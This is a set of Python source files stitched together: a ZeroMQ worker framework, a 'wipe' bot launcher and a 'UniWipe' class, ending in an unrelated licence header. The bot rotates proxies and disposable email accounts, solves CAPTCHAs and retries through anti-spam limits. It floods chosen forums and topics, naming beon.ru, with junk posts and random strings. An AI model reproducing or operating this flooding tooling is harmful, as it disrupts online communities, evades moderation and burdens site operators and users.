                    self.log.warn('Timeout {0}, retrying'.format(data[0]))
                    that.retry = True
                else:
                    self.log.warning('Recvd unknown reply for (%s, %s) %s: %s', i, m,
                        wzrpc.name_status(status), repr(data))
            self.wz_wait_reply(accept,
                *self.wz.make_auth_req_data(i, m, wzauth_data.request[i, m]))


    def bind_route(self, i, m, f):
        self.log.debug('Binding %s,%s route', i, m)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.wz.set_req_handler(i, m, f)
                self.log.debug('Succesfully binded route (%s, %s)', i, m)
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.auth_requests()
            elif wzrpc.status.e_timeout:
                self.log.warn('Timeout {0}, retrying'.format(data[0]))
                that.retry = True
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        return self.wz_wait_reply(accept,
                *self.wz.make_auth_bind_route_data(i, m, wzauth_data.bind_route[i, m]))

    def set_route_type(self, i, m, t):
        self.log.debug('Setting %s,%s type to %d', i, m, t)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Succesfully set route type for (%s, %s) to %s', i, m,
                    wzrpc.name_route_type(t))
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.auth_requests()
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        return self.wz_wait_reply(accept,
            *self.wz.make_auth_set_route_type_data(i, m, t,
                wzauth_data.set_route_type[i, m]))

    def unbind_route(self, i, m):
        if not (i, m) in self.wz.req_handlers:
            self.log.debug('Route %s,%s was not bound', i, m)
            return
        self.log.debug('Unbinding route %s,%s', i, m)
        self.wz.del_req_handler(i, m)
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Route unbinded for (%s, %s)', i, m)
            else:
                self.log.warn('Status %s, passing', wzrpc.name_status(status))
        return self.wz_wait_reply(accept,
            *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m]))
    
    def clear_auth(self):
        self.log.debug('Clearing our auth records')
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Auth records on router were cleared')
            else:
                self.log.warn('Status %s, passing', wzrpc.name_status(status))
        return self.wz_wait_reply(accept, *self.wz.make_auth_clear_data())

    def bind_methods(self):
        for i, m, f, t in self.wz_bind_methods:
            self.set_route_type(i, m, t)
            self.bind_route(i, m, f)
    
    def unbind_methods(self):  
        for i, m, f, t in self.wz_bind_methods:
            self.unbind_route(i, m)
        #self.clear_auth()

    def send_rep(self, reqid, seqnum, status, data):
        self.wz_sock.send_multipart(
            self.wz.make_router_rep_msg(reqid, seqnum, status, data))

    def send_success_rep(self, reqid, data):
        self.send_rep(reqid, 0, wzrpc.status.success, data)
    
    def send_error_rep(self, reqid, data):
        self.send_rep(reqid, 0, wzrpc.status.error, data)

    def send_wz_error(self, reqid, data, seqid=0):
        msg = self.wz.make_dealer_rep_msg(
            reqid, seqid, wzrpc.status.error, data)
        self.wz_sock.send_multipart(msg)
        
    def send_to_router(self, msg):
        msg.insert(0, b'')
        self.wz_sock.send_multipart(msg)
    
    # def bind_sig_route(self, routetype, interface, method, fun):
    #     self.log.info('Binding %s,%s as type %d signal route',
    #                   interface, method, routetype)
    #     self.wz.set_signal_handler(interface, method, fun)
    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'bind-sig-route',
    #                                       [interface, method],
    #                                       self.accept_ok)
    #     self.wz_sock.send_multipart(msg)

    # def unbind_sig_route(self, interface, method):
    #     self.log.info('Deleting %s,%s signal route', interface, method)
    #     self.wz.del_signal_handler(interface, method)
    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'unbind-sig-route',
    #                                       [interface, method],
    #                                       self.accept_ok)
    #     self.wz_sock.send_multipart(msg)

    def inter_sleep(self, timeout):
        self.sleep_ticker.tick()
        self.poll(timeout * 1000)                    
        while self.sleep_ticker.elapsed(False) < timeout:
            try:
                self.poll(timeout * 1000)                    
            except Resume as e:                    
                return

    def poll(self, timeout=None):
        try:
            socks = dict(self.poller.poll(timeout if timeout != None                    
                else self.poll_timeout))
        except zmq.ZMQError as e:
            self.log.error(e)
            return
        if socks.get(self.sig_sock) == zmq.POLLIN:
            # No special handling or same-socket replies are necessary for signals.
            # Backwards socket replies may be added here.
            frames = self.sig_sock.recv_multipart()
            try:
                self.wz.parse_msg(frames[0], frames[1:])
            except wzrpc.WZError as e:
                self.log.warn(e)
        if socks.get(self.wz_sock) == zmq.POLLIN:
            self.process_wz_msg(self.wz_sock.recv_multipart())
        return socks

    def process_wz_msg(self, frames):
        try:
            for nfr in self.wz.parse_router_msg(frames):
                # Send replies from the handler, for cases when it's methods were rewritten.
                self.wz_sock.send_multipart(nfr)
        except wzrpc.WZErrorRep as e:
            self.log.info(e)
            self.wz_sock.send_multipart(e.rep_msg)
        except wzrpc.WZError as e:
            self.log.warn(e)

    def run(self):
        self.__sinit__()
        if self.start_timer:
            self.inter_sleep(self.start_timer)
        if self.running:
            self.log.info('Starting')
            try:
                self.child = self.call[0](*self.call[1], **self.call[2])
                self.child(self)
            except WorkerInterrupt as e:
                self.log.warn(e)
            except Exception as e:
                self.log.exception(e)
            self.log.info('Terminating')
        else:
            self.log.info('Aborted')
        self.running.set() # wz_multiwait needs this to avoid another state check.
        self.unbind_methods()
        self.running.clear()
        self.wz_sock.close()
        self.sig_sock.close()
    
    def term(self):
        self.running.clear()


class WZWorkerThread(WZWorkerBase, threading.Thread):
    def start(self, ctx, sig_addr, *args, **kvargs):
        self.ctx = ctx
        self.sig_addr = sig_addr
        threading.Thread.start(self, *args, **kvargs)

class WZWorkerProcess(WZWorkerBase, multiprocessing.Process):
    def start(self, sig_addr, *args, **kvargs):
        self.sig_addr = sig_addr
        multiprocessing.Process.start(self, *args, **kvargs)
    
    def __sinit__(self):
        self.ctx = zmq.Context()
        super().__sinit__()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- mode: python -*-
import sys
if 'lib' not in sys.path:
    sys.path.append('lib')
import os, signal, logging, threading, re, traceback, time
import random
import zmq
from queue import Queue
import sup
import wzworkers as workers
from dataloader import DataLoader
from uniwipe import UniWipe
from wipeskel import *
import wzrpc
from beon import regexp
import pickle

from logging import config
from logconfig import logging_config
config.dictConfig(logging_config)
logger = logging.getLogger()

ctx = zmq.Context()
sig_addr = 'ipc://signals'
sig_sock = ctx.socket(zmq.PUB)
sig_sock.bind(sig_addr)

# Settings for you
domains = set() # d.witch_domains
targets = dict() # d.witch_targets
protected = set() # will be removed later
forums = dict() # target forums

# from lib import textgen
# with open('data.txt', 'rt') as f:
#     model = textgen.train(f.read())
# def mesasge():
#     while True:                    
#         s = textgen.generate_sentence(model)
#         try:                    
#             s.encode('cp1251')
#             break
#         except Exception:
#             continue
#     return s

def message():
    msg = []
    # msg.append('[video-youtube-'+
    #            random.choice(('3odl-KoNZwk', 'bu55q_3YtOY', '4YPiCeLwh5o',
    #                           'eSBybJGZoCU', 'ZtWTUt2RZh0', 'VXa9tXcMhXQ',))
    #            +']')
    msg.append('[image-original-none-http://simg4.gelbooru.com/'
               + '/images/db/1d/db1dfb62a40f5ced2043bb8966da9a98.png]')
    msg.append('     .')
    # msg.append('[video-youtube-'+random.choice(
    #     # ('WdDb_RId-xU', 'EFL1-fL-WtM', 'uAOoiIkFQq4',
    #     #  'eZO3K_4yceU', '1c1lT_HgJNo', 'WOkvVVaJ2Ks',
    #     #  'KYq90TEdxIE', 'rWBM2whL0bI', '0PDy_MKYo4A'))
    #     #('GabBLLOT6vw', 'qgvOpSquCAY', 'zUe-z9DZBNo', '4fCbfDEKZss', 'uIE-JgmkmdM'))
    #     ('42JQYPioVo4', 'jD6j072Ep1M', 'mPyF5ovoIVs', 'cEEi1BHycb0', 'PuA1Wf8nkxw',
    #      'ASJ9qlsPgHU', 'DP1ZDW9_xOo', 'bgSqH9LT-mI', ))
    # +']')
    # http://simg2.gelbooru.com//images/626/58ca1c9a8ffcdedd0e2eb6f33c9389cb7588f0d1.jpg
    # msg.append('Enjoy the view!')
    msg.append(str(random.randint(0, 9999999999)))
    return '\n'.join(msg)

def sbjfun():
    # return 'Out of the darkness we will rise, into the light we will dwell'
    return sup.randstr(1, 30)

# End
import argparse

parser = argparse.ArgumentParser(add_help=True)
parser.add_argument('--only-cache', '-C', action='store_true',
    help="Disables any requests in DataLoader (includes Witch)")
parser.add_argument('--no-shell', '-N', action='store_true',
    help="Sleep instead of starting the shell")
parser.add_argument('--tcount', '-t', type=int, default=10,
    help='WipeThread count')
parser.add_argument('--ecount', '-e', type=int, default=0,
    help='EvaluatorProxy count')
parser.add_argument('--upload-avatar', action='store_true', default=False,
    help='Upload random avatar after registration')
parser.add_argument('--av-dir', default='randav', help='Directory with avatars')
parser.add_argument('--rp-timeout', '-T', type=int, default=10,
    help='Default rp timeout in seconds')
parser.add_argument('--conlimit', type=int, default=3,
    help='http_request conlimit')
parser.add_argument('--noproxy-timeout', type=int, default=5,
    help='noproxy_rp timeout')

parser.add_argument('--caprate_minp', type=int, default=5,
    help='Cap rate minimum possible count for limit check')
parser.add_argument('--caprate_limit', type=float, default=0.8,
    help='Captcha rate limit')

parser.add_argument('--comment_successtimeout', type=float, default=0.8,
    help='Comment success timeout')
parser.add_argument('--topic_successtimeout', type=float, default=0.1,
    help='Topic success timeout')
parser.add_argument('--errortimeout', type=float, default=3,
    help='Error timeout')


parser.add_argument('--stop-on-closed', action='store_true', default=False,
    help='Forget about closed topics')
parser.add_argument('--die-on-neterror', action='store_true', default=False,
    help='Terminate spawn in case of too many NetErrors')

c = parser.parse_args()

# rps = {}

noproxy_rp = sup.net.RequestPerformer()
noproxy_rp.proxy = ''
noproxy_rp.timeout = c.noproxy_timeout
noproxy_rp.timeout = c.rp_timeout

# rps[''] = noproxy_rp

# Achtung: DataLoader probably isn't thread-safe.
d = DataLoader(noproxy_rp, c.only_cache)
c.router_addr = d.addrs['rpcrouter']
noproxy_rp.useragent = random.choice(d.ua_list)

def terminate():
    logger.info('Shutdown initiated')
    # send_passthrough([b'GLOBAL', b'WZWorker', b'terminate'])
    send_to_wm([b'GLOBAL', b'WZWorker', b'terminate'])
    for t in threading.enumerate():
        if isinstance(t, threading.Timer):
            t.cancel()
    # try:                    
    #     wm.term()
    #     wm.join()
    # except: # WM instance is not created yet.
    #     pass
    logger.info('Exiting')

def interrupt_handler(signal, frame):
    pass # Just do nothing

def terminate_handler(signal, frame):
    terminate()

signal.signal(signal.SIGINT, interrupt_handler)
signal.signal(signal.SIGTERM, terminate_handler)

def make_net(proxy, proxytype):
    # if proxy in rps:
    #     return rps[proxy]
    net = sup.net.RequestPerformer()
    net.proxy = proxy
    if proxytype == 'HTTP' or proxytype == 'HTTPS':
        net.proxy_type = sup.proxytype.http
    elif proxytype == 'SOCKS4':
        net.proxy_type = sup.proxytype.socks4
    elif proxytype == 'SOCKS5':
        net.proxy_type = sup.proxytype.socks5
    else:                    
        raise TypeError('Invalid proxytype %s' % proxytype)
    # rps[proxy] = net
    net.useragent = random.choice(d.ua_list)
    net.timeout = c.rp_timeout
    return net

# UniWipe patching start
def upload_avatar(self, ud):
    if ('avatar_uploaded' in ud[0] and
        ud[0]['avatar_uploaded'] is True):
        return
    files = []
    for sd in os.walk(c.av_dir):
        files.extend(sd[2])
    av = os.path.join(sd[0], random.choice(files))
    self.log.info('Uploading %s as new avatar', av)
    self.site.uploadavatar('0', av)
    ud[0]['avatar'] = av
    ud[0]['avatar_uploaded'] = True

from lib.mailinator import Mailinator
# from lib.tempmail import TempMail as Mailinator

# Move this to WipeManager
def create_spawn(proxy, proxytype, pc, uq=None):
    for domain in domains:
        if domain in targets:
            tlist = targets[domain]
        else:                    
            tlist = list()
            targets[domain] = tlist
        if domain in forums:
            fset = forums[domain]
        else:                    
            fset = set()
            forums[domain] = fset
        net = make_net(proxy, proxytype)
        net.cookiefname = (proxy if proxy else 'noproxy')+'_'+domain
        w = UniWipe(fset, tlist, sbjfun, message, pc, net, domain, Mailinator,
            uq(domain) if uq else None)
        w.stoponclose = c.stop_on_closed
        w.die_on_neterror = c.die_on_neterror
        w.caprate_minp = c.caprate_minp
        w.caprate_limit = c.caprate_limit
        w.conlimit = c.conlimit
        w.comment_successtimeout = 0.2
        if c.upload_avatar:
            w.hooks['post_login'].append(upload_avatar)
        yield w

# UniWipe patching end

class WipeManager:
    def __init__(self, config, *args, **kvargs):
        super().__init__(*args, **kvargs)
        self.newproxyfile = 'newproxies.txt'
        self.proxylist = set()
        self.c = config
        self.threads = []
        self.processes = []
        self.th_sa = 'inproc://wm-wth.sock'
        self.th_ba = 'inproc://wm-back.sock'
        self.pr_sa = 'ipc://wm-wpr.sock'
        self.pr_ba = 'ipc://wm-back.sock'
        self.userqueues = {}
        self.usersfile = 'wm_users.pickle'
        self.targetsfile = 'wm_targets.pickle'
        self.bumplimitfile = 'wm_bumplimit.pickle'

    def init_th_sock(self):
        self.log.info(
            'Initializing intraprocess signal socket %s', self.th_sa)
        self.th_sock = self.p.ctx.socket(zmq.PUB)
        self.th_sock.bind(self.th_sa)

    def init_th_back_sock(self):
        self.log.info(
            'Initializing intraprocess backward socket %s', self.th_ba)
        self.th_back_sock = self.p.ctx.socket(zmq.ROUTER)
        self.th_back_sock.bind(self.th_ba)

    def init_pr_sock(self):
        self.log.info(
            'Initializing interprocess signal socket %s', self.pr_sa)
        self.pr_sock = self.p.ctx.socket(zmq.PUB)
        self.pr_sock.bind(self.pr_sa)

    def init_pr_back_sock(self):
        self.log.info(
            'Initializing interprocess backward socket %s', self.pr_ba)
        self.pr_back_sock = self.p.ctx.socket(zmq.ROUTER)
        self.pr_back_sock.bind(self.pr_ba)

    def read_newproxies(self):
        if not os.path.isfile(self.newproxyfile):
            return
        newproxies = set()
        with open(self.newproxyfile, 'rt') as f:
            for line in f:
                try:                    
                    line = line.rstrip('\n')
                    proxypair = tuple(line.split(' '))
                    if len(proxypair) < 2:
                        self.log.warning('Line %s has too few spaces', line)
                        continue
                    if len(proxypair) > 2:
                        self.log.debug('Line %s has too much spaces', line)
                        proxypair = (proxypair[0], proxypair[1])
                    newproxies.add(proxypair)
                except Exception as e:
                    self.log.exception('Line %s raised exception %s', line, e)
        # os.unlink(self.newproxyfile)
        return newproxies.difference(self.proxylist)

    def add_spawns(self, proxypairs):
        while self.running.is_set():
            try:                    
                try:                    
                    proxypair = proxypairs.pop()
                except Exception:
                    return
                self.proxylist.add(proxypair)
                for spawn in create_spawn(proxypair[0], proxypair[1], self.pc,
                        self.get_userqueue):
                    self.log.info('Created spawn %s', spawn.name)
                    self.spawnqueue.put(spawn, False)
            except Exception as e:
                self.log.exception('Exception "%s" raised on create_spawn', e)

    def spawn_workers(self, wclass, count, args=(), kvargs={}):
        wname = str(wclass.__name__)
        self.log.info('Starting %s(s)', wname)
        if issubclass(wclass, workers.WZWorkerThread):
            type_ = 0
            if not hasattr(self, 'th_sock'):
                self.init_th_sock()
            if not hasattr(self, 'th_back_sock'):
                self.init_th_back_sock()
        elif issubclass(wclass, workers.WZWorkerProcess):
            type_ = 1
            if not hasattr(self, 'pr_sock'):
                self.init_pr_sock()
            if not hasattr(self, 'pr_back_sock'):
                self.init_pr_back_sock()
        else:                    
            raise Exception('Unknown wclass type')
        for i in range(count):
            if not self.running.is_set():
                break
            try:                    
                w = wclass(*args, name='.'.join(
                    (wname, ('pr{0}' if type_ else 'th{0}').format(i))),
                    **kvargs)
                if type_ == 0:
                    self.threads.append(w)
                    w.start(self.p.ctx, self.th_sa)
                elif type_ == 1:
                    self.processes.append(w)
                    w.start(self.pr_sa)
            except Exception as e:
                self.log.exception('Exception "%s" raised on %s spawn',
                                   e, wname)

    def spawn_nworkers(self, type_, fun, count, args=(), kvargs={}):
        wname = str(fun.__name__)
        self.log.info('Starting %s(s)', wname)
        if type_ == 0:
            if not hasattr(self, 'th_sock'):
                self.init_th_sock()
            if not hasattr(self, 'th_back_sock'):
                self.init_th_back_sock()
        elif type_ == 1:
            if not hasattr(self, 'pr_sock'):
                self.init_pr_sock()
            if not hasattr(self, 'pr_back_sock'):
                self.init_pr_back_sock()
        else:                    
            raise Exception('Unknown wclass type')
        for i in range(count):
            if not self.running.is_set():
                break
            try:                    
                if type_ == 0:
                    w = workers.WZWorkerThread(
                        self.c.router_addr, fun, args, kvargs,
                        name='.'.join((wname, 'th{0}'.format(i))))
                    self.threads.append(w)
                    w.start(self.p.ctx, self.th_sa)
                elif type_ == 1:
                    w = workers.WZWorkerProcess(self.c.router_addr, fun, args, kvargs,
                        name='.'.join((wname, 'pr{0}'.format(i))))
                    self.processes.append(w)
                    w.start(self.pr_sa)
            except Exception as e:
                self.log.exception('Exception "%s" raised on %s spawn',
                                   e, wname)

    def spawn_wipethreads(self):
        return self.spawn_nworkers(0, WipeThread, self.c.tcount,
                                  (self.pc, self.spawnqueue))

    def spawn_evaluators(self):
        self.log.info('Initializing Evaluator')
        from evproxy import EvaluatorProxy
        def ev_init():
            from lib.evaluators.PyQt4Evaluator import Evaluator
            return Evaluator()
        return self.spawn_nworkers(1, EvaluatorProxy, self.c.ecount,
                                  (ev_init,))

    def load_users(self):
        if not os.path.isfile(self.usersfile):
            return
        with open(self.usersfile, 'rb') as f:
            users = pickle.loads(f.read())
        try:                    
            for domain in users.keys():
                uq = Queue()
                for ud in users[domain]:
                    self.log.debug('Loaded user %s:%s', domain, ud['login'])
                    uq.put(ud)
                self.userqueues[domain] = uq
        except Exception as e:
            self.log.exception(e)
            self.log.error('Failed to load users')

    def save_users(self):
        users = {}
        for d, uq in self.userqueues.items():
            uqsize = uq.qsize()
            uds = []
            for i in range(uqsize):
                uds.append(uq.get(False))
            users[d] = uds
        with open(self.usersfile, 'wb') as f:
            f.write(pickle.dumps(users, pickle.HIGHEST_PROTOCOL))
        self.log.info('Saved users')

    def get_userqueue(self, domain):
        try:                    
            uq = self.userqueues[domain]
        except KeyError:
            self.log.info('Created userqueue for %s', domain)
            uq = Queue()
            self.userqueues[domain] = uq
        return uq

    def load_targets(self):
        fname = self.targetsfile
        if not os.path.isfile(fname):
            return
        with open(fname, 'rb') as f:
            data = pickle.loads(f.read())
        if 'targets' in data:
            self.log.debug('Target list was loaded')
            targets.update(data['targets'])
        if 'forums' in data:
            self.log.debug('Forum set was loaded')
            forums.update(data['forums'])
        if 'domains' in data:
            self.log.debug('Domain set was loaded')
            domains.update(data['domains'])
        if 'sets' in data:
            self.log.debug('Other sets were loaded')
            self.pc.sets.update(data['sets'])

    def load_bumplimit_set(self):
        if not os.path.isfile(self.bumplimitfile):
            return
        with open(self.bumplimitfile, 'rb') as f:
            self.pc.sets['bumplimit'].update(pickle.loads(f.read()))

    def save_targets(self):
        data = {
            'targets': targets,
            'forums': forums,
            'domains': domains,
            'sets': self.pc.sets,
            }
        with open(self.targetsfile, 'wb') as f:
            f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))

    def targets_from_witch(self):
        for t in d.witch_targets:
            if t['domain'] == 'beon.ru' and t['forum'] == 'anonymous':
                try:                    
                    add_target_exc(t['id'], t['user'])
                except ValueError:
                    pass

    def terminate(self):
        msg = [b'GLOBAL']
        msg.extend(wzrpc.make_sig_msg(b'WZWorker', b'terminate', []))
        if hasattr(self, 'th_sock'):
            self.th_sock.send_multipart(msg)
        if hasattr(self, 'pr_sock'):
            self.pr_sock.send_multipart(msg)

    def join_threads(self):
        for t in self.threads:
            t.join()

    def send_passthrough(self, interface, method, frames):
        msg = [frames[0]]
        msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))
        self.th_sock.send_multipart(msg)
        self.pr_sock.send_multipart(msg)

    def __call__(self, parent):
        self.p = parent
        self.log = parent.log
        self.inter_sleep = parent.inter_sleep
        self.running = parent.running
        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeManager')
        self.p.wz.set_sig_handler(b'WipeManager', b'passthrough', self.send_passthrough)
        if self.c.tcount > 0:
            self.pc = ProcessContext(self.p.name, self.p.ctx,
                self.c.router_addr, noproxy_rp)
            self.spawnqueue = Queue()
            self.load_bumplimit_set()
            self.load_targets()
            self.load_users()
            self.spawn_wipethreads()
        if self.c.ecount > 0:
            self.spawn_evaluators()
        try:                    
            while self.running.is_set():
                # self.targets_from_witch()
                if self.c.tcount == 0:
                    self.inter_sleep(5)
                    continue
                self.pc.check_waiting()
                new = self.read_newproxies()
                if not new:
                    self.inter_sleep(5)
                    continue
                self.add_spawns(new)
        except WorkerInterrupt:
            pass
        except Exception as e:
            self.log.exception(e)
        self.terminate()
        self.join_threads()
        if self.c.tcount > 0:
            self.save_users()
            self.save_targets()

wm = workers.WZWorkerThread(c.router_addr, WipeManager, (c,),
    name='SpaghettiMonster')
wm.start(ctx, sig_addr)

def add_target(domain, id_, tuser=None):
    if domain not in targets:
        targets[domain] = []
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    logger.info('Appending %s to targets[%s]', repr(t), domain)
    tlist.append(t)

def remove_target(domain, id_, tuser=None):
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    logger.info('Removing %s from targets[%s]', repr(t), domain)
    tlist.remove(t)

def add_target_exc(domain, id_, tuser=None):
    if domain not in targets:
        targets[domain] = []
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    if t in protected:
        raise ValueError('%s is protected' % repr(t))
    if t not in tlist:
        logger.info('Appending %s to targets[%s]', repr(t), domain)
        tlist.append(t)

r_di = re.compile(regexp.f_udi)

def atfu(urls):
    for user, domain, id1, id2 in r_di.findall(urls):
        id_ = id1+id2
        add_target(domain, id_, user)

def rtfu(urls):
    for user, domain, id1, id2 in r_di.findall(urls):
        id_ = id1+id2
        remove_target(domain, id_, user)

def get_forum_id(name):
    id_ = d.bm_id_forum.get_key(name)
    int(id_, 10)  # id is int with base 10
    return id_

# def aftw(name):
#     id_ = get_forum_id(name)
#     logger.info('Appending %s (%s) to forums', name, id_)
#     forums.append(id_)

# def rffw(name):
#     id_ = get_forum_id(name)
#     logger.info('Removing %s (%s) from forums', name, id_)
#     forums.remove(id_)

# def aftw(name):
#     id_ = get_forum_id(name)
#     logger.info('Appending %s to forums', name)
#     forums.add(name)

# def rffw(name):
#     id_ = get_forum_id(name)
#     logger.info('Removing %s from forums', name)
#     forums.remove(name)

r_udf = re.compile(regexp.udf_prefix)

def affu(urls):
    for user, domain, forum in r_udf.findall(urls):
        if domain not in forums:
            forums[domain] = set()
        if len(forum) > 0:
            get_forum_id(forum)
        logger.info('Appending %s:%s to forums[%s]', user, forum, domain)
        forums[domain].add((user, forum))

def rffu(urls):
    for user, domain, forum in r_udf.findall(urls):
        if len(forum) > 0:
            get_forum_id(forum)
        logger.info('Removing %s:%s from forums[%s]', user, forum, domain)
        forums[domain].remove((user, forum))

def add_user(domain, login, passwd):
    uq = wm.get_userqueue(domain)
    uq.put({'login': login, 'passwd': passwd}, False)

def send_to_wm(frames):
    msg = [frames[0]]
    msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))
    sig_sock.send_multipart(msg)

def send_passthrough(frames):
    msg = [b'WipeManager']
    msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))
    sig_sock.send_multipart(msg)

def drop_users():
    send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])

def log_spawn_name():
    send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])

if c.no_shell:                    
    while True:                    
        time.sleep(1)                    
else:                    
    try:                    
        import IPython                    
        IPython.embed()
    except ImportError:                    
        # fallback shell
        while True:                    
            try:                    
                exec(input('> '))
            except KeyboardInterrupt:
                print("KeyboardInterrupt")
            except SystemExit:
                break
            except:
                print(traceback.format_exc())

terminate()

# -*- coding: utf-8 -*-
# -*- mode: python -*-
from sup.net import NetError
from wzworkers import WorkerInterrupt
from wipeskel import WipeSkel, WipeState, cstate
from beon import exc, regexp
import re

class UniWipe(WipeSkel):
    def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs):
        self.sbjfun = sbjfun
        self.msgfun = msgfun
        self.forums = forums
        self.targets = (type(targets) == str and [('', targets)]
                        or type(targets) == tuple and list(targets)
                        or targets)
        super().__init__(*args, **kvargs)

    def on_caprate_limit(self, rate):
        if not self.logined:
            self._capdata = (0, 0)
            return
        self.log.warning('Caprate limit reached, calling dologin() for now')
        self.dologin()
        # super().on_caprate_limit(rate)

    def comment_loop(self):
        for t in self.targets:
            self.schedule(self.add_comment, (t, self.msgfun()))
        if len(self.targets) == 0:
            self.schedule(self.scan_targets_loop)
        else:
            self.schedule(self.comment_loop)

    def add_comment(self, t, msg):
        # with cstate(self, WipeState.posting_comment):
        if True: # Just a placeholder
            try:
                # self.counter_tick()
                self.postmsg(t[1], msg, t[0])
            except exc.Success as e:
                self.counters['comments'] += 1
                self.w.sleep(self.comment_successtimeout)
            except exc.Antispam as e:
                self.w.sleep(self.comment_successtimeout)
                self.schedule(self.add_comment, (t, msg))
            except (exc.Closed, exc.UserDeny) as e:
                try:
                    self.targets.remove(t)
                except ValueError:
                    pass
                self.w.sleep(self.comment_successtimeout)
            except exc.Captcha as e:
                self.log.error('Too many wrong answers to CAPTCHA')
                self.schedule(self.add_comment, (t, msg))
            except exc.UnknownAnswer as e:
                self.log.warn('%s: %s', e, e.answer)
                self.schedule(self.add_comment, (t, msg))
            except exc.Wait5Min as e:
                self.schedule(self.add_comment, (t, msg))
                self.schedule_first(self.switch_user)
            except exc.EmptyAnswer as e:
                self.log.info('Removing %s from targets', t)                    
                try:
                    self.targets.remove(t)
                except ValueError as e:
                    pass
                self.w.sleep(self.errortimeout)
            except exc.TemporaryError as e:
                self.schedule(self.add_comment, (t, msg))
                self.w.sleep(self.errortimeout)
            except exc.PermanentError as e:
                try:
                    self.targets.remove(t)
                except ValueError as e:
                    pass
                self.w.sleep(self.errortimeout)
            except UnicodeDecodeError as e:
                self.log.exception(e)
                self.w.sleep(self.errortimeout)

    def forumwipe_loop(self):
        for f in self.forums:                    
            self.counter_tick()
            try:
                self.addtopic(self.msgfun(), self.sbjfun(), f)
            except exc.Success as e:
                self.counters['topics'] += 1
                self.w.sleep(self.topic_successtimeout)
            except exc.Wait5Min as e:
                self.topic_successtimeout = self.topic_successtimeout + 0.1
                self.log.info('Wait5Min exc caught, topic_successtimeout + 0.1, cur: %f',
                    self.topic_successtimeout)
                self.w.sleep(self.topic_successtimeout)
            except exc.Captcha as e:
                self.log.error('Too many wrong answers to CAPTCHA')
                self.long_sleep(10)
            except exc.UnknownAnswer as e:
                self.log.warning('%s: %s', e, e.answer)
                self.w.sleep(self.errortimeout)
            except exc.PermanentError as e:
                self.log.error(e)
                self.w.sleep(self.errortimeout)
            except exc.TemporaryError as e:
                self.log.warn(e)
                self.w.sleep(self.errortimeout)

    def get_targets(self):
        found_count = 0
        for user, forum in self.forums:
            targets = []
            self.log.debug('Scanning first page of the forum %s:%s', user, forum)
            page = self.site.get_page('1', forum, user)
            rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))
            found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))
            for t in found:
                if (t in self.pc.sets['closed']                    
                    or t in self.pc.sets['bumplimit']                    
                    or t in self.targets):                    
                    continue
                targets.append(t)
            lt = len(targets)
            found_count += lt
            if lt > 0:
                self.log.info('Found %d new targets in forum %s:%s', lt, user, forum)
            else:
                self.log.debug('Found no new targets in forum %s:%s', user, forum)
            self.targets.extend(targets)
        return found_count

    def scan_targets_loop(self):
        with cstate(self, WipeState.scanning_for_targets):
            while len(self.targets) == 0:
                c = self.get_targets()
                if c == 0:
                    self.log.info('No targets found at all, sleeping for 30 seconds')
                    self.long_sleep(30)
            self.schedule(self.comment_loop)
        if len(self.forums) == 0:
            self.schedule(self.wait_loop)

    def wait_loop(self):
        if len(self.targets) > 0:
            self.schedule(self.comment_loop)
            return
        if len(self.forums) == 0:
            with cstate(self, WipeState.waiting_for_targets):
                while len(self.forums) == 0:
                    # To prevent a busy loop.
                    self.counter_tick()
                    self.w.sleep(1)
        self.schedule(self.scan_targets_loop)

    def _run(self):
        self.schedule(self.dologin)
        self.schedule(self.wait_loop)
        self.schedule(self.counter_ticker.tick)
        try:
            self.perform_tasks()
        except NetError as e:
            self.log.error(e)
        except WorkerInterrupt as e:
            self.log.warning(e)
        except Exception as e:
            self.log.exception(e)
        self.return_user()
# tw_flag = False
# if len(self.targets) > 0:
#     with cstate(self, WipeState.posting_comment):
#         while len(self.targets) > 0:
#             self.threadwipe_loop()
#     if not tw_flag:
#         tw_flag = True
# if tw_flag:
#     # Sleep for topic_successtimeout after last comment
#     # to prevent a timeout spike
#     self.w.sleep(self.topic_successtimeout)
#     tw_flag = False
# with cstate(self, WipeState.posting_topic):
# self.forumwipe_loop()

# -*- coding: utf-8 -*-
#
# Copyright  2014 Ren Samselnig
#
# This file is part of Database Navigator.
#
# Database Navigator is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Database Navigator is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Database Navigator.  If not, see <http://www.gnu.org/licenses/>.
#

import sys
import os
import logging
import pdb
import urllib2
import json
import ijson

from dbnav.writer import Writer
from dbnav import logger as log
